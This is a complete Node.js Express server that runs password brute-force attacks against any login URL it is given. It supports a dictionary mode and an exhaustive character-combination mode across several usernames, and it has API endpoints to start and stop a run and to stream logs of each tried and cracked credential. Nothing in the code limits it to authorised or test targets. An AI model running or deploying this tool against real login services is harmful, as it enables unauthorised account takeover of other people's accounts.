const express = require('express');
const cors = require('cors');
const fs = require('fs');
const path = require('path');

const app = express();
app.use(cors());
app.use(express.json());

// Global state for the attack
let attackLogs = [];
let isRunning = false;
let shouldStop = false;

// Append a log and handle formatting 
function addLog(message) {
  const timestamp = new Date().toLocaleTimeString();
  attackLogs.push(`[${timestamp}] ${message}`);
  // Keep logs from gobbling up too much memory (last 500 lines) 
  if (attackLogs.length > 500) {
     attackLogs = attackLogs.slice(-500);
  }
}

// Function that handles the brute force logic mapped from your index.js script
async function runAttack(targetUrl, targetUsername, options) {
  attackLogs = [];
  isRunning = true;
  shouldStop = false;
  let count = 0;
  
  const { attackType, dictionaryName, characters, length } = options;
  
  addLog(`Starting Brute Force Attack...`);
  addLog(`Target URL: ${targetUrl}`);
  addLog(`Target Username: ${targetUsername}`);
  
  if (attackType === 'dictionary') {
    addLog(`Dictionary: ${dictionaryName}`);
  } else {
    addLog(`Custom Brute Force: Characters='${characters}', Length=${length}`);
  }
  
  const startTime = Date.now();

  // ── Pre-flight connectivity check ──────────────────────────────────────────
  // Try hitting the URL once before loading any wordlist.
  // This catches wrong URLs, typos, or servers that aren't running.
  addLog(`Checking target URL reachability...`);
  try {
    await fetch(targetUrl, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ username: '__probe__', password: '__probe__' }),
      signal: AbortSignal.timeout(5000), // 5-second timeout
    });
    addLog(`Target URL is reachable. Starting attack...`);
  } catch (probeErr) {
    const isNetworkError =
      probeErr.cause?.code === 'ECONNREFUSED' ||
      probeErr.cause?.code === 'ENOTFOUND' ||
      probeErr.cause?.code === 'ECONNRESET' ||
      probeErr.name === 'TimeoutError' ||
      probeErr.message?.includes('fetch failed');

    if (isNetworkError) {
      addLog(`\n[!] ERROR: Target URL is unreachable.`);
      addLog(`[!] URL: ${targetUrl}`);
      addLog(`[!] Reason: ${probeErr.cause?.message || probeErr.message}`);
      addLog(`[!] Make sure the target server is running and the URL is correct.`);
      addLog(`[!] Attack aborted — no passwords were tried.`);
      isRunning = false;
      return;
    }
    // If the server responded with an error status (401, 404, etc.) that's fine —
    // it means the server IS reachable, the probe just got rejected as expected.
    addLog(`Target URL is reachable (responded to probe). Starting attack...`);
  }
  // ───────────────────────────────────────────────────────────────────────────

  try {
    let wordsIterable;

    if (attackType === 'dictionary') {
      const filePath = path.join(__dirname, '..', dictionaryName);
      if (!fs.existsSync(filePath)) {
          addLog(`ERROR: Dictionary file '${dictionaryName}' not found in attack directory.`);
          isRunning = false;
          return;
      }

      const data = fs.readFileSync(filePath, 'utf8');
      const words = data.split(/\r?\n/).filter(w => w.trim());
      addLog(`Loaded ${words.length} passwords from dictionary.`);
      wordsIterable = words;
    } else {
      const chars = characters;
      const len = parseInt(length, 10);
      const totalCombinations = Math.pow(chars.length, len);
      addLog(`Total possible combinations: ${totalCombinations}`);
      
      function* generateCombinations(c, l, currentPrefix = '') {
          if (shouldStop) return;
          if (l === 0) {
              yield currentPrefix;
              return;
          }
          for (let i = 0; i < c.length; i++) {
              yield* generateCombinations(c, l - 1, currentPrefix + c[i]);
          }
      }
      wordsIterable = {
          [Symbol.iterator]: () => generateCombinations(chars, len)
      };
    }

    addLog(`Initiating network requests...`);
    
    let activeUsers = targetUsername.split(',').map(u => u.trim()).filter(u => u.length > 0);
    if (activeUsers.length === 0) {
        addLog(`ERROR: No target usernames provided.`);
        isRunning = false;
        return;
    }

    for (const word of wordsIterable) {
      if (shouldStop) {
          addLog(`\n[!] Attack manually stopped by user.`);
          break;
      }

      const password = typeof word === 'string' ? word.trim() : word;
      if (!password) continue;

      for (let i = 0; i < activeUsers.length; i++) {
          const tUser = activeUsers[i];
          if (shouldStop) break;
          
          count++;
          addLog(`[Attempt ${count}] Trying ${tUser}:${password}`);
          
          try {
              const response = await fetch(targetUrl, {
                  method: 'POST',
                  headers: {
                      'Content-Type': 'application/json',
                  },
                  body: JSON.stringify({
                      username: tUser,
                      password: password,
                  }),
              });
              
              if (response.ok) {
                const timeTaken = (Date.now() - startTime) / 1000;
                addLog(`\n[+] SUCCESS! Password found for user '${tUser}': ${password}`);
                
                // Remove this user from the active list
                activeUsers.splice(i, 1);
                i--; // adjust index after removal
              } else if (response.status === 429) {
                addLog(`\n[!] ATTACK BLOCKED: Rate Limit Exceeded (429 Too Many Requests)`);
                addLog(`[!] The target server is actively defending against brute force.`);
                addLog(`[!] Aborting attack run to prevent IP ban...`);
                isRunning = false;
                return; // Break completely out of the attack loop
              }
          } catch (reqErr) {
              // Detect hard network errors: wrong URL, server went down, DNS failure, etc.
              const isNetworkError =
                reqErr.cause?.code === 'ECONNREFUSED' ||
                reqErr.cause?.code === 'ENOTFOUND' ||
                reqErr.cause?.code === 'ECONNRESET' ||
                reqErr.name === 'TimeoutError' ||
                reqErr.message?.includes('fetch failed');

              if (isNetworkError) {
                addLog(`\n[!] NETWORK ERROR: Lost connection to target server.`);
                addLog(`[!] URL: ${targetUrl}`);
                addLog(`[!] Reason: ${reqErr.cause?.message || reqErr.message}`);
                addLog(`[!] The server may have gone down or the URL is wrong.`);
                addLog(`[!] Aborting attack.`);
                isRunning = false;
                return; // Stop the entire attack immediately
              }

              // Transient error (e.g. one-off timeout) — log and skip this attempt
              addLog(`[-] Attempt ${count} failed (transient): ${reqErr.message} — skipping.`);
          }
      }

      if (activeUsers.length === 0) {
          addLog(`\n[+] All target users were successfully cracked!`);
          const timeTaken = (Date.now() - startTime) / 1000;
          addLog(`⏰ Time taken: ${timeTaken} seconds`);
          break;
      }
    }

    if (!shouldStop && activeUsers.length > 0) {
      const timeTaken = (Date.now() - startTime) / 1000;
      addLog(`\n[-] Finished. Tried ${count} combinations.`);
      if (activeUsers.length < targetUsername.split(',').filter(x => x.trim()).length) {
          addLog(`Some passwords were found, but not for all users.`);
      } else {
          addLog(`No matches found for any user.`);
      }
      addLog(`⏰ Total time elapsed: ${timeTaken} seconds`);
    }
  } catch (err) {
    addLog(`ERROR: ${err.message}`);
    console.error(err);
  }

  isRunning = false;
}

app.get('/api/status', (req, res) => {
    res.json({ isRunning });
});

app.get('/api/logs', (req, res) => {
    res.json({ logs: attackLogs });
});

app.post('/api/start', (req, res) => {
    const { url, username, dictionary, attackType, characters, length } = req.body;
    
    if (isRunning) {
        return res.status(400).json({ error: 'Attack is already running.' });
    }
    if (!url || !username) {
        return res.status(400).json({ error: 'Missing target URL or username.' });
    }

    const options = {
        attackType: attackType || 'dictionary',
        dictionaryName: dictionary,
        characters: characters || '',
        length: length || 0
    };

    // Fire and forget the attack logic
    runAttack(url, username, options);
    
    res.json({ message: 'Attack started' });
});

app.post('/api/stop', (req, res) => {
    if (!isRunning) {
        return res.status(400).json({ error: 'No attack is currently running.' });
    }
    shouldStop = true;
    res.json({ message: 'Stopping attack...' });
});

const PORT = 3001;
app.listen(PORT, () => {
    console.log(`Brute Force API Server running on port ${PORT}`);
});
